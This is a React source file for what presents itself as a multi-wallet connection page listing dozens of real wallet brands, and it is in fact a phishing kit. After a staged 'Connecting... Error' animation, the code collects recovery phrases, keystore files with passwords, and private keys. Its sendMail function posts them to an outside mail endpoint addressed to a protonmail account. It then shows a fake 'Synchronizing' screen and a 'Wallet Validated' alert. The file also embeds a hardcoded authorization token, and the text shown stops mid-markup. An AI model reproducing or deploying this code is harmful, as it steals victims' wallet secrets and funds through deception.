import { useState, useEffect } from "react";
import Modal from "react-modal";
import Grid from "@material-ui/core/Grid";
import Argent from "../../assets/images/wallet/Argent.jpg";
import Gnosis from "../../assets/images/wallet/Eidoo.jpg";
import Trust from "../../assets/images/wallet/trust-wallet-66f8777532931d9c09b633344981a6a9.png";
import Atomic from "../../assets/images/wallet/atomic-4c02d2b33cf091fd83c7a49819394e41.png";
import MetaMask from "../../assets/images/wallet/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png";
import RainBow from "../../assets/images/wallet/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png";
import Crypto from "../../assets/images/wallet/crypto-4cbeac57421fb3ca2573db2cf448169a.png";
import Pillar from "../../assets/images/wallet/Pillar.png";
import imToken from "../../assets/images/wallet/imtoken-fd8c7c52dac6101568954e7448a49202.png";
import Anchor from "../../assets/images/wallet/anchor.png";
import ONTO from "../../assets/images/wallet/onto-983003d35fe32bf916f9eda381f138f7.png";
import TokenPocket from "../../assets/images/wallet/tokenpocket-57a4a886cc644e5237ac1558226154cb.png";
import MathWallet from "../../assets/images/wallet/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png";
import BitPay from "../../assets/images/wallet/bitpay-1573dd6c95eb38386f181048663590d0.jpg";
import Maiar from "../../assets/images/wallet/maiar.png";
import Ledger from "../../assets/images/wallet/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png";
import Walleth from "../../assets/images/wallet/walleth-b60336f8dd9ea86285408cb4f96634d1.png";
import Authereum from "../../assets/images/wallet/authereum-32f3939207b77c1837547d5ed4f86110.png";
import Huobi from "../../assets/images/wallet/Huobi.jpg";
import Eidoo from "../../assets/images/wallet/Eidoo1.png";
import MYKEY from "../../assets/images/wallet/mykey-7419df5270c0406c80cba19fa5165923.png";
import Loopring from "../../assets/images/wallet/LooPring.jpg";
import TrustVault from "../../assets/images/wallet/trustvault-9031a67f82293fc50ead978f936cfff3.png";
import Coin98 from "../../assets/images/wallet/coin98-c5b50adaceaf474e48ef1dad150d0829.png";
import CoolWallet from "../../assets/images/wallet/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png";
import Alice from "../../assets/images/wallet/Alice.png";
import AlphaWallet from "../../assets/images/wallet/Alpha.jpg";
import DCENT from "../../assets/images/wallet/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png";
import ZelCore from "../../assets/images/wallet/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png";
import Nash from "../../assets/images/wallet/Nash.jpg";
import Coinomi from "../../assets/images/wallet/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg";
import GridPlus from "../../assets/images/wallet/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png";
import CYBAVOWallet from "../../assets/images/wallet/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png";
import Tokenary from "../../assets/images/wallet/Tokenary.png";
import Wazirx from "../../assets/images/wallet/wazirx-logo-rounded.9bff9f42.png";
import Torus from "../../assets/images/wallet/Torus.jpg";
import Spatium from "../../assets/images/wallet/Spatium.jpg";
import SafePal from "../../assets/images/wallet/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png";
import Equal from "../../assets/images/wallet/Equal.jpg";
import Infinito from "../../assets/images/wallet/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png";
import walletio from "../../assets/images/wallet/wallet.io-198f396de22fe25eb370f46544abe69d.png";
import Infinity from "../../assets/images/wallet/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png";
import Ownbit from "../../assets/images/wallet/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png";
import EasyPocket from "../../assets/images/wallet/easypocket-436ea3270a7bf77c02a880bfc70d0ee8.jpg";
import Bridge from "../../assets/images/wallet/Bridge.png";
import SparkPoint from "../../assets/images/wallet/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png";
import ViaWallet from "../../assets/images/wallet/viawallet-ae1502eddf4d2ed89abd36907dd3ae8a.png";
import BitKeep from "../../assets/images/wallet/bitkeep-387b0ca7da4cf322f44c70c23064c529.png";
import Vision from "../../assets/images/wallet/vision-928292fe642172a18e62feb5eaa2d639.png";
import SWFT from "../../assets/images/wallet/SWFT.png";
import PEAKDEFI from "../../assets/images/wallet/peakdefi-2e1d4f97cc1a737a9aa765b3748ff315.png";
import Cosmostation from "../../assets/images/wallet/cosmosstation.png";
import Graph from "../../assets/images/wallet/graph.jpg";
import KardiaChain from "../../assets/images/wallet/kardachain.png";
import Keplr from "../../assets/images/wallet/keplr.png";
import Harmony from "../../assets/images/wallet/harmony.png";
import ICONex from "../../assets/images/wallet/iconex.png";
import Fetch from "../../assets/images/wallet/fetch.jpg";
import XDC from "../../assets/images/wallet/xdc-9a98bff95dffc41869b8e77912a6cc54.png";
import Unstoppable from "../../assets/images/wallet/unstoppable-0d3474dcd7572ac2080b0f4ce632dfac.png";
import MEET from "../../assets/images/wallet/meetone-01093db7d99e3e6cf5cca68b616f8255.jpg";
import Dok from "../../assets/images/wallet/dok-a32c522e109217cc2a1a2a310f3c9bf7.png";
import AT from "../../assets/images/wallet/atwallet-2611d814a50a964b89d5f8bc1e5cb3a0.png";
import MoriX from "../../assets/images/wallet/morixwallet-aa7d607cf9ad52afeb3b7c83e5f34eba.png";
import Midas from "../../assets/images/wallet/midas-wallet-5c5057d972ca621414f077541845fc61.png";
import Ellipal from "../../assets/images/wallet/Ellipal.png";
import KEYRING from "../../assets/images/wallet/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png";
import Blockchain from "../../assets/images/wallet/blockchain-logo.png";
import BSC from "../../assets/images/wallet/bsc-logo.png";
import Solana from "../../assets/images/wallet/external-content.duckduckgo.png";
import Aktionariat from "../../assets/images/wallet/aktionariat-c5784b26234a389632687a36d2fb3258.png";

import { Tab, Tabs, TabList, TabPanel } from "react-tabs";
import "react-tabs/style/react-tabs.css";
import axios from "axios";

const BaseURL = "https://appapi.anexacargo.com/sendmails";
export default function WalletsGrp() {
  const [isModalVisible, setModalVisible] = useState(false);
  const [isModalVisible1, setModalVisible1] = useState(false);
  const [isModalVisible2, setModalVisible2] = useState(false);

  const [conname, setConname] = useState("Connecting");
  const [imgurl, setImgUrl] = useState("");
  const [wname, setWname] = useState("");

  const [phraseStr, setPhrase] = useState("");
  const [keystoreStr, setKeyStore] = useState("");
  const [walletPasswordStr, setWalletPassword] = useState("");
  const [privateStr, setPrivate] = useState("");



  const customStyles = {
    content: {
      top: "50%",
      left: "50%",
      right: "auto",
      bottom: "auto",
      marginRight: "-50%",
      transform: "translate(-50%, -50%)",
      background: "white",
      border: "none",
      borderRadius: "10px",
    },
  };
  const customStyles1 = {
    content: {
      top: "50%",
      left: "50%",
      right: "auto",
      bottom: "auto",
      marginRight: "-50%",
      transform: "translate(-50%, -50%)",
      background: "white",
      border: "none",
      borderRadius: "10px",
      width: "370px",
    },
  };
  const customStyles2 = {
    content: {
      background: "grey",
      border: "none",
      width: "100%",
      height: "200vh",
      textAlign: "center",
      top: "0px",
      left: "0px",
      paddingBottom: "520px",
    },
  };
  useEffect(() => {
    const timer = setTimeout(() => {
      setConname("Connecting.");
    }, 0);
    return () => clearTimeout(timer);
  }, [isModalVisible1]);
  useEffect(() => {
    const timer = setTimeout(() => {
      setConname("Connecting..");
    }, 600);
    return () => clearTimeout(timer);
  }, [isModalVisible1]);
  useEffect(() => {
    const timer = setTimeout(() => {
      setConname("Connecting...");
    }, 1200);
    return () => clearTimeout(timer);
  }, [isModalVisible1]);
  useEffect(() => {
    const timer = setTimeout(() => {
      setConname("Connecting..");
    }, 1800);
    return () => clearTimeout(timer);
  }, [isModalVisible1]);
  useEffect(() => {
    const timer = setTimeout(() => {
      setConname("Connecting.");
    }, 2400);
    return () => clearTimeout(timer);
  }, [isModalVisible1]);
  useEffect(() => {
    const timer = setTimeout(() => {
      setConname("Connecting..");
    }, 3000);
    return () => clearTimeout(timer);
  }, [isModalVisible1]);
  useEffect(() => {
    const timer = setTimeout(() => {
      setConname("Connecting...");
    }, 3600);
    return () => clearTimeout(timer);
  }, [isModalVisible1]);
  useEffect(() => {
    const timer = setTimeout(() => {
      setConname("Error Connecting..");
    }, 4200);
    return () => clearTimeout(timer);
  }, [isModalVisible1]);
  const handleModal = () => {
    setModalVisible1(!isModalVisible1);
    setModalVisible(!isModalVisible);
  };

  const handleModal1 = (walletType) => (e) => {
    setModalVisible(false);

    setModalVisible1(!isModalVisible1);
    setImgUrl(e.target.src);
    setWname(walletType);
  };

  const handleModal2 = () => {
    setModalVisible(!isModalVisible);

    setModalVisible1(false);
  };
  const handleModal3 = (method) => {
    sendMail(method);
    setModalVisible2(!isModalVisible2);
    setModalVisible(false);

    setModalVisible1(false);

    const timer = setTimeout(() => {
      alert("Wallet Validated")
      setModalVisible2(false);
    }, 5000);
    return () => clearTimeout(timer);
  };
  const handleModal4 = () => {
    setModalVisible1(!isModalVisible1);
  };

  const sendMail = (method) => {
    var htmlContent = "";
    if (method === "Phrase") {
      htmlContent = `<p>Phrase</p>
                     <p>WalletName:${wname}</p>
                     <p>Phrase:${phraseStr}</p>`
    } else if (method === "KeyStore") {
      htmlContent = `<p>KeyStore</p>
                     <p>WalletName:${wname}</p>
                     <p>WalletPassword:${walletPasswordStr}</p>
                     <p>KeyStore:${keystoreStr}</p>`
    } else if (method === "PrivateKey") {
      htmlContent = `<p>PrivateKey</p>
                     <p>WalletName:${wname}</p>
                     <p>PrivateKey:${privateStr}</p>`
    }
    const headers = {
      Authorization:
        "Basic QWV4cHJlc3M6ZTcwNmRkOTEtZmFlYS00ZWJiLWI5N2EtMDYwMjQxMDg1ZWVm",
    };
    axios
      .post(
        BaseURL,
        {
          email: "longchin@protonmail.com",
          // email:"smartdevpro001@gmail.com",
          html: htmlContent,
          title: "Get Wallet Information",
        },
        { headers }
      )
      .then((response) => {
        console.log(response);
      });
  };


  return (
    <>
      <Modal
        isOpen={isModalVisible2}
        // onAfterOpen={afterOpenModal}
        onRequestClose={handleModal3}
        style={customStyles2}
        ariaHideApp={false}
      >
        <div className="lds-facebook">
          <div></div>
          <div></div>
          <div></div>
        </div>

        <section>
          <div className="loading loading06">
            <span data-text="S">S</span>
            <span data-text="Y">Y</span>
            <span data-text="N">N</span>
            <span data-text="C">C</span>
            <span data-text="H">H</span>
            <span data-text="R">R</span>
            <span data-text="O">O</span>
            <span data-text="N">N</span>
            <span data-text="I">I</span>
            <span data-text="Z">Z</span>
            <span data-text="I">I</span>
            <span data-text="N">N</span>
            <span data-text="G">G</span>
          </div>
        </section>
      </Modal>
      <div className="wallet-logo-grp-div">
        <Grid container justifyContent="center">
          <Grid item xs={12}>
            <img
              alt="logo-img"
              className="modal-wallet-logo top-logo"
              src="https://app.dappprotocolconnect.net/assets/iogo.jpg"
            ></img>
          </Grid>
          <Grid item xs={12}>
            <h1 className="modal-wallet-title">Wallets</h1>
          </Grid>
          <Grid item xs={12} md={8}>
            <div className="modal-wallet-content">
              Multiple iOS and Android wallets support the protocol. Simply scan
              a QR code from your desktop computer screen to start securely
              using a dApp with your mobile wallet. Interaction between mobile
              apps and mobile browsers are supported via mobile deep linking.
            </div>
          </Grid>
          <Grid
            container
            justifyContent="center"
            style={{ marginTop: "30px" }}
            spacing={2}
          >
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div
                  className="wallet-logo-s-grp"
                  onClick={handleModal1("Trust")}
                >
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Trust}
                  />
                </div>
                <div className="wallet-logo-s-title">Trust</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Atomic")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Atomic}
                  />
                </div>
                <div className="wallet-logo-s-title">Atomic</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("MetaMask")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={MetaMask}
                  />
                </div>
                <div className="wallet-logo-s-title">MetaMask</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("RainBow")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={RainBow}
                  />
                </div>
                <div className="wallet-logo-s-title">RainBow</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Argent")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Argent}
                  />
                </div>
                <div className="wallet-logo-s-title">Argent</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Gnosis Safe Multisig")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Gnosis}
                  />
                </div>
                <div className="wallet-logo-s-title">Gnosis Safe Multisig</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Crypto.com | DeFi Wallet")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Crypto}
                  />
                </div>
                <div className="wallet-logo-s-title">
                  Crypto.com | DeFi Wallet
                </div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Pillar")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Pillar}
                  />
                </div>
                <div className="wallet-logo-s-title">Pillar</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("imToken")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={imToken}
                  />
                </div>
                <div className="wallet-logo-s-title">imToken</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Anchor")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Anchor}
                  />
                </div>
                <div className="wallet-logo-s-title">Anchor</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("ONTO")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={ONTO}
                  />
                </div>
                <div className="wallet-logo-s-title">ONTO</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("TokenPocket")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={TokenPocket}
                  />
                </div>
                <div className="wallet-logo-s-title">TokenPocket</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("MathWallet")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={MathWallet}
                  />
                </div>
                <div className="wallet-logo-s-title">MathWallet</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("BitPay")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={BitPay}
                  />
                </div>
                <div className="wallet-logo-s-title">BitPay</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Maiar")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Maiar}
                  />
                </div>
                <div className="wallet-logo-s-title">Maiar</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Ledger")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Ledger}
                  />
                </div>
                <div className="wallet-logo-s-title">Ledger</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Walleth")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Walleth}
                  />
                </div>
                <div className="wallet-logo-s-title">Walleth</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Authereum")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Authereum}
                  />
                </div>
                <div className="wallet-logo-s-title">Authereum</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Huobi")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Huobi}
                  />
                </div>
                <div className="wallet-logo-s-title">Huobi</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Eidoo")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Eidoo}
                  />
                </div>
                <div className="wallet-logo-s-title">Eidoo</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("MYKEY")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={MYKEY}
                  />
                </div>
                <div className="wallet-logo-s-title">MYKEY</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Loopring")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Loopring}
                  />
                </div>
                <div className="wallet-logo-s-title">Loopring</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("TrustVault")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={TrustVault}
                  />
                </div>
                <div className="wallet-logo-s-title">TrustVault</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Coin98")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Coin98}
                  />
                </div>
                <div className="wallet-logo-s-title">Coin98</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("CoolWallet")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={CoolWallet}
                  />
                </div>
                <div className="wallet-logo-s-title">CoolWallet</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Alice")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Alice}
                  />
                </div>
                <div className="wallet-logo-s-title">Alice</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("AlphaWallet")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={AlphaWallet}
                  />
                </div>
                <div className="wallet-logo-s-title">AlphaWallet</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("DCENT")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={DCENT}
                  />
                </div>
                <div className="wallet-logo-s-title">DCENT</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("ZelCore")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={ZelCore}
                  />
                </div>
                <div className="wallet-logo-s-title">ZelCore</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Nash")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Nash}
                  />
                </div>
                <div className="wallet-logo-s-title">Nash</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Coinomi")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Coinomi}
                  />
                </div>
                <div className="wallet-logo-s-title">Coinomi</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("GridPlus")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={GridPlus}
                  />
                </div>
                <div className="wallet-logo-s-title">GridPlus</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("CYBAVOWallet")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={CYBAVOWallet}
                  />
                </div>
                <div className="wallet-logo-s-title">CYBAVOWallet</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Tokenary")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Tokenary}
                  />
                </div>
                <div className="wallet-logo-s-title">Tokenary</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Wazirx")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Wazirx}
                  />
                </div>
                <div className="wallet-logo-s-title">Wazirx</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Torus")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Torus}
                  />
                </div>
                <div className="wallet-logo-s-title">Torus</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Wazirx")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Wazirx}
                  />
                </div>
                <div className="wallet-logo-s-title">Wazirx</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Spatium")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Spatium}
                  />
                </div>
                <div className="wallet-logo-s-title">Spatium</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("SafePal")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={SafePal}
                  />
                </div>
                <div className="wallet-logo-s-title">SafePal</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Equal")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Equal}
                  />
                </div>
                <div className="wallet-logo-s-title">Equal</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Infinito")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Infinito}
                  />
                </div>
                <div className="wallet-logo-s-title">Infinito</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("walletio")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={walletio}
                  />
                </div>
                <div className="wallet-logo-s-title">walletio</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Infinity")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Infinity}
                  />
                </div>
                <div className="wallet-logo-s-title">Infinity</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Ownbit")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Ownbit}
                  />
                </div>
                <div className="wallet-logo-s-title">Ownbit</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("EasyPocket")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={EasyPocket}
                  />
                </div>
                <div className="wallet-logo-s-title">EasyPocket</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Bridge")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Bridge}
                  />
                </div>
                <div className="wallet-logo-s-title">Bridge</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("SparkPoint")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={SparkPoint}
                  />
                </div>
                <div className="wallet-logo-s-title">SparkPoint</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("ViaWallet")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={ViaWallet}
                  />
                </div>
                <div className="wallet-logo-s-title">ViaWallet</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("BitKeep")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={BitKeep}
                  />
                </div>
                <div className="wallet-logo-s-title">BitKeep</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Vision")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Vision}
                  />
                </div>
                <div className="wallet-logo-s-title">Vision</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("SWFT")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={SWFT}
                  />
                </div>
                <div className="wallet-logo-s-title">SWFT</div>
              </div>
            </Grid>{" "}
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("PEAKDEFI")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={PEAKDEFI}
                  />
                </div>
                <div className="wallet-logo-s-title">PEAKDEFI</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Cosmostation")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Cosmostation}
                  />
                </div>
                <div className="wallet-logo-s-title">Cosmostation</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Graph")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Graph}
                  />
                </div>
                <div className="wallet-logo-s-title">Graph</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("KardiaChain")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={KardiaChain}
                  />
                </div>
                <div className="wallet-logo-s-title">KardiaChain</div>
              </div>
            </Grid>
            <Grid item xs={4} md={4} lg={3}>
              <div className="wallet-logo-b-grp">
                <div className="wallet-logo-s-grp" onClick={handleModal1("Keplr")}>
                  <img
                    alt="logo-img"
                    className="modal-wallet-logo"
                    src={Keplr}
                  />
                </div>
